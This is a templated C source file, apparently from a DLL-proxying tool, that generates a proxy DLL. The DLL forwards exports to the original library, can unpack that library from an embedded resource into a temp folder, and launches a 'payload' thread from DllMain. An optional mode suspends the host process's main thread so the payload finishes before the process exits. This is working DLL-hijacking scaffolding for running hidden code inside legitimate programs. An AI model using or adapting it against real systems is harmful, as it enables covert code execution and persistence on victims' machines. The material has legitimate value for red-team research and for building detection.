/* --- Function pointer table --- */
{% for exp in exports %}
FARPROC fp_{{ exp.safe_name }} = NULL;
{% endfor %}

/* --- Resolve all exports from the original DLL --- */
void resolve_exports(HMODULE hOriginal) {
{% for exp in exports %}
{% if exp.is_named %}
    fp_{{ exp.safe_name }} = GetProcAddress(hOriginal, "{{ exp.name }}");
{% else %}
    fp_{{ exp.safe_name }} = GetProcAddress(hOriginal, (LPCSTR)MAKEINTRESOURCE({{ exp.ordinal }}));
{% endif %}
{% endfor %}
}

{% if embed_enabled %}
/* --- Extract embedded DLL from resource and load it --- */
static BOOL load_embedded_dll(void) {
    HRSRC hRes = FindResourceA(hSelf, MAKEINTRESOURCEA(IDR_ORIGINAL_DLL), "BINARY");
    if (!hRes) return FALSE;

    HGLOBAL hGlobal = LoadResource(hSelf, hRes);
    if (!hGlobal) return FALSE;

    LPVOID pData = LockResource(hGlobal);
    DWORD dwSize = SizeofResource(hSelf, hRes);
    if (!pData || dwSize == 0) return FALSE;

    char szTempDir[MAX_PATH];
    GetTempPathA(MAX_PATH, szTempDir);
    lstrcatA(szTempDir, "proxy_fw\\");
    CreateDirectoryA(szTempDir, NULL);

    lstrcpyA(szTempPath, szTempDir);
    lstrcatA(szTempPath, "{{ original_dll_filename }}");

    HANDLE hFile = CreateFileA(szTempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD dwWritten;
    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);

    if (dwWritten != dwSize) return FALSE;

    hOriginalDll = LoadLibraryA(szTempPath);
    return hOriginalDll != NULL;
}
{% endif %}

{% if not embed_enabled %}
/* --- Load original DLL from disk --- */
static BOOL load_original_dll(void) {
    /* Try loading with the prefixed name first */
    hOriginalDll = LoadLibraryA("{{ original_dll_path }}");
    if (hOriginalDll) return TRUE;

    /* Fallback: try from our own directory */
    char szPath[MAX_PATH];
    GetModuleFileNameA(hSelf, szPath, MAX_PATH);
    char *pSlash = strrchr(szPath, '\\');
    if (pSlash) {
        *(pSlash + 1) = '\0';
        lstrcatA(szPath, "{{ original_dll_path }}");
        hOriginalDll = LoadLibraryA(szPath);
    }
    return hOriginalDll != NULL;
}
{% endif %}

/* --- Initialize proxy --- */
static void init_proxy(void) {
{% if embed_enabled %}
    if (!load_embedded_dll()) {
        OutputDebugStringA("[DLL Proxy] FATAL: Failed to load embedded DLL\n");
        return;
    }
{% else %}
    if (!load_original_dll()) {
        OutputDebugStringA("[DLL Proxy] FATAL: Failed to load original DLL\n");
        return;
    }
{% endif %}
    resolve_exports(hOriginalDll);
{% if payload_enabled %}
{% if block_enabled %}
    hPayloadDone = CreateEventA(NULL, TRUE, FALSE, NULL);
    DuplicateHandle(GetCurrentProcess(), GetCurrentThread(),
                    GetCurrentProcess(), &hMainThread,
                    THREAD_SUSPEND_RESUME, FALSE, 0);
    hPayloadThread = CreateThread(NULL, 0, payload_wrapper, NULL, 0, NULL);
{% else %}
    hPayloadThread = CreateThread(NULL, 0, payload_main, NULL, 0, NULL);
{% endif %}
{% endif %}
}

{% if payload_enabled and block_enabled %}
/*
 * Wrapper that freezes the main thread so the process can't exit,
 * then runs the payload. When payload finishes, terminates the process.
 * If main reaches atexit first, the fallback wait keeps it alive instead.
 */
static DWORD WINAPI payload_wrapper(LPVOID lpParam) {
    if (hMainThread) {
        SuspendThread(hMainThread);
    }

    payload_main(lpParam);

    SetEvent(hPayloadDone);
    ExitProcess(0);
    return 0;
}

/* Fallback: if main exits before payload can suspend it */
static void wait_for_payload(void) {
    if (hPayloadDone) {
        WaitForSingleObject(hPayloadDone, INFINITE);
    }
}
{% endif %}

/* --- Cleanup --- */
static void cleanup_proxy(void) {
{% if payload_enabled %}
    if (hPayloadThread != NULL) {
        CloseHandle(hPayloadThread);
        hPayloadThread = NULL;
    }
{% if block_enabled %}
    if (hMainThread != NULL) {
        CloseHandle(hMainThread);
        hMainThread = NULL;
    }
    if (hPayloadDone != NULL) {
        CloseHandle(hPayloadDone);
        hPayloadDone = NULL;
    }
{% endif %}
{% endif %}
    if (hOriginalDll) {
        FreeLibrary(hOriginalDll);
        hOriginalDll = NULL;
    }
{% if embed_enabled %}
    if (szTempPath[0] != '\0') {
        DeleteFileA(szTempPath);
    }
{% endif %}
}

/* --- DLL Entry Point --- */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    (void)lpReserved;
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        hSelf = hinstDLL;
        DisableThreadLibraryCalls(hinstDLL);
        init_proxy();
{% if payload_enabled and block_enabled %}
        atexit(wait_for_payload);
{% endif %}
        break;
    case DLL_PROCESS_DETACH:
        cleanup_proxy();
        break;
    }
    return TRUE;
}
